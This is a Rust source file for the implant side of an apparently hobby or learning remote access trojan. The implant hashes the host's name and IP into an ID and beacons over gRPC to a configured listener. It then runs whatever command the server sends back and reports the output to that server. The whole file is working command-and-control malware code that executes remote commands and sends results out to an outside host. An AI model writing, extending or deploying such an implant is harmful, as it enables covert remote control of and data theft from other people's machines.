use remote_access_trojan::rat::ask_for_instructions_client::AskForInstructionsClient;
use remote_access_trojan::rat::record_command_result_client::RecordCommandResultClient;
use remote_access_trojan::rat::{Beacon, CommandResponse};
use std::collections::hash_map::DefaultHasher;
use std::hash::{Hash, Hasher};
use std::process::Command;
use std::time::SystemTime;
use tonic::transport::Endpoint;

fn calculate_hash<T: Hash>(t: &T) -> u64 {
    let mut s = DefaultHasher::new();
    t.hash(&mut s);
    s.finish()
}

fn generate_implant_id() -> String {
    let hostname = Command::new("hostname")
                            .output()
                            .unwrap();
    let hostname = String::from_utf8(hostname.stdout).unwrap();
    let hostname = hostname.trim();

    let ip_address = Command::new("hostname")
                            .arg("-I")
                            .output()
                            .unwrap();
    let ip_address = String::from_utf8(ip_address.stdout).unwrap();
    let ip_address = ip_address.trim();

    let hashed_value = calculate_hash(&format!("{hostname}:{ip_address}"));
    format!("{hashed_value:x}")
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("implant");

    let implant_id = generate_implant_id();

    // Can I send a protobuf from the client to the server?
    let ip_address = rco_config::LISTENER_IP;
    let port = rco_config::LISTENER_PORT;
    let socket = format!("http://{ip_address}:{port}");
    let channel = Endpoint::from_shared(socket)?
                           .connect()
                           .await?;
    let mut ask_client = AskForInstructionsClient::new(channel.clone());
    let mut response_client = RecordCommandResultClient::new(channel);
    let request = tonic::Request::new(
        Beacon {
            last_received: 0
        },
    );
    let response = ask_client.send(request).await?.into_inner();
    println!("Response={response:?}");

    let command_received = response.command;
    if !command_received.is_empty() {
        let command = Command::new(&command_received)
                              .output()
                              .unwrap();
        let command_response = String::from_utf8(command.stdout).unwrap();
        let result = tonic::Request::new(
            CommandResponse {
                implant_id: implant_id,
                timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
                command: command_received,
                result: command_response
            },
        );
        let response = response_client.send(result).await?.into_inner();
        println!("{response:?}");
    }

    Ok(())
}